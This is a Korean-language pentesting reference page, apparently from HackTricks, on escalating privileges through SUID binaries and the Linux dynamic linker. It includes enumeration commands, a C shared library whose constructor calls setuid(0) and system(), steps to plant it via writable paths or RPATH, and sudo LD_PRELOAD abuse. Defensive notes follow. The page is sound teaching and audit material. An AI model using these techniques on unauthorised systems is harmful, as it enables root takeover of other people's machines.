# SUID Shared Library and Linker Abuse

SUID binaries는 일반적으로 직접적인 command execution 여부를 검토하지만, custom SUID programs는 dynamic linker를 통해서도 취약할 수 있습니다. 공통적인 원리는 간단합니다. privileged executable이 권한이 낮은 사용자가 영향을 줄 수 있는 path 또는 configuration에서 code를 로드하는 것입니다.<sup>[[1]](#references)</sup>

이 페이지는 missing libraries, writable library directories, `RPATH`/`RUNPATH`, sudo를 통한 `LD_PRELOAD`, linker configuration, SUID hardlink confusion 등 generic technique patterns에 초점을 맞춥니다.

## Fast Enumeration

먼저 특이한 SUID files를 찾고, 해당 파일이 dynamically linked인지 확인합니다.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
비표준 위치, 사용자 지정 애플리케이션 경로, 패키지 관리 디렉터리 외부에 있으면서 root가 소유한 바이너리, 그리고 쓰기 가능한 디렉터리에서 로드되는 dependencies에 중점을 둡니다.<sup>[[1]](#references)</sup>

유용한 쓰기 가능성 확인:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

일부 custom SUID binary는 존재하지 않는 shared object를 load하려고 합니다. 누락된 path가 attacker가 제어하는 directory 아래에 있다면, 해당 binary는 effective user 권한으로 attacker가 제공한 code를 load할 수 있습니다.<sup>[[1]](#references)</sup>

`strace`의 syscall filter를 사용하여 실패한 library lookup을 찾습니다:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
바이너리가 쓰기 가능한 경로에서 `libexample.so`를 검색한다면, 최소한의 영향 증명용 library는 constructor를 사용할 수 있습니다. 검증 중에는 영향 증명을 무해하게 유지하세요:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
바이너리가 로드하려고 하는 정확한 파일 이름으로 빌드합니다:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
악용 가능한 조건은 library가 누락된 것만이 아닙니다. 공격자는 권한이 높은 loader가 허용하는 경로에 호환되는 shared object를 배치할 수 있어야 합니다.<sup>[[1]](#references)</sup>

## 쓰기 가능한 Library Directory

때로는 모든 dependency가 존재하지만, 이를 확인하는 데 사용되는 directory 중 하나에 쓰기 권한이 있습니다. 이 경우 로드된 library를 교체하거나 같은 이름을 가진 우선순위가 더 높은 library를 심을 수 있습니다.<sup>[[1]](#references)</sup>

dependency 경로를 검토합니다:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
디렉터리에 쓰기 권한이 있다면, lab에서 copy-safe approach로 검증하세요. live host에서 system libraries를 교체하면 동시에 시작되는 process가 서로 일치하지 않는 library versions를 사용하게 될 수 있습니다.<sup>[[8]](#references)</sup>

## RPATH and RUNPATH

`RPATH`와 `RUNPATH`는 loader에 libraries를 검색할 위치를 알려주는 dynamic-section entries입니다. attacker-writable directories를 가리키는 SUID programs에서는 위험합니다.<sup>[[1]](#references)</sup>

다음과 같이 탐지합니다:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
위험한 출력 예시:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
`/opt/app/lib`에 쓰기 권한이 있고 binary가 `libcustom.so`를 필요로 한다면, 공격자는 해당 위치에 악성 `libcustom.so`를 배치할 수 있습니다:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH`와 `RUNPATH`는 모든 resolution 세부 사항에서 동일하지 않지만, privilege-escalation 검토에서 실질적인 질문은 동일합니다. SUID binary가 library name을 찾을 때 attacker-writable directory를 검색하는가?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH and SUID

일반적인 program에서는 `LD_PRELOAD`와 `LD_LIBRARY_PATH`가 shared object loading을 강제하거나 이에 영향을 줄 수 있습니다. SUID program의 경우 dynamic loader는 일반적으로 secure-execution mode로 진입하여 위험한 environment variable을 무시합니다.<sup>[[1]](#references)</sup>

즉, 사용자가 `LD_PRELOAD`를 설정할 수 있다는 이유만으로 일반적인 SUID binary가 취약한 것은 아닙니다:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
일반적인 예외는 대상 명령에 대해 loader 변수를 설정하거나 유지할 수 있도록 허용하는 sudo policy입니다. `sudo -l`에서 `env_keep+=LD_PRELOAD` 또는 `env_keep+=LD_LIBRARY_PATH`와 같은 항목을 확인하세요. 대상이 dynamically linked인 경우 attacker-controlled code를 로드할 수 있습니다:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
이러한 경우를 혼동하지 마세요. 위의 loader 및 sudo policy rules에서 이들을 구분합니다:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- 일반 SUID binary에 대한 `LD_PRELOAD`: 일반적으로 secure execution에 의해 차단됩니다.
- sudo에 의해 보존되는 `LD_PRELOAD`: 잠재적으로 exploit이 가능합니다.
- writable path에 누락된 `.so`: SUID binary가 해당 path를 정상적으로 load할 때 exploit이 가능합니다.
- writable directory를 가리키는 `RPATH`/`RUNPATH`: 필요한 library를 control할 수 있을 때 exploit이 가능합니다.
- `/etc/ld.so.preload` 또는 linker config에 대한 write access: system-wide이며 영향도가 높습니다.

## Linker Configuration

`ld.so`는 linker cache와 `/etc/ld.so.preload`를 사용합니다. `ldconfig`는 `/etc/ld.so.conf` 및 여기에서 include된 files(일반적으로 `/etc/ld.so.conf.d/`)에서 해당 cache를 생성합니다.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

우선적으로 확인할 항목:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
쓰기 가능한 linker configuration은 단일 취약 SUID binary보다 일반적으로 더 심각합니다. 여러 dynamically linked process에 영향을 줄 수 있기 때문입니다. 특히 `/etc/ld.so.preload`은 privileged process에 shared object를 강제로 로드할 수 있어 매우 위험합니다.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlink를 사용하면 동일한 SUID inode가 여러 이름으로 표시되도록 만들 수 있습니다.<sup>[[9]](#references)</sup> 이는 privileged helper를 숨기거나, 정리 작업을 혼란스럽게 하거나, 단순한 path 기반 검토를 우회하는 데 유용합니다.

링크가 둘 이상인 SUID 파일을 찾습니다.<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
동일한 inode를 가리키는 모든 경로를 검사합니다:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
악용의 핵심은 hardlink가 권한을 변경한다는 것이 아닙니다. 악용은 path confusion입니다. 즉, 권한이 있는 inode에 방어 담당자나 스크립트가 예상하지 못하는 이름을 통해 접근할 수 있습니다.<sup>[[9]](#references)</sup> inode와 hardlink workflow에 대해 자세히 알아보려면 [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md)를 참조하세요.

## Defensive Notes

- SUID binaries를 가능한 한 최소화하고, 감사하며, package-managed 상태로 유지하세요.
- writable 또는 application-managed directories를 가리키는 `RPATH`/`RUNPATH` entries를 피하세요.<sup>[[1]](#references)[[8]](#references)</sup>
- library directories는 root-owned 상태로 유지하고 regular users가 write할 수 없도록 하세요.<sup>[[8]](#references)</sup>
- sudo를 통해 `LD_PRELOAD`, `LD_LIBRARY_PATH` 또는 유사한 loader variables를 보존하지 마세요.<sup>[[1]](#references)[[5]](#references)</sup>
- `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` 및 예상하지 못한 SUID files를 모니터링하세요.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- hardlinked SUID files를 검토하고 standard system paths 외부에 있는 custom SUID wrappers를 조사하세요.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux manual page](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
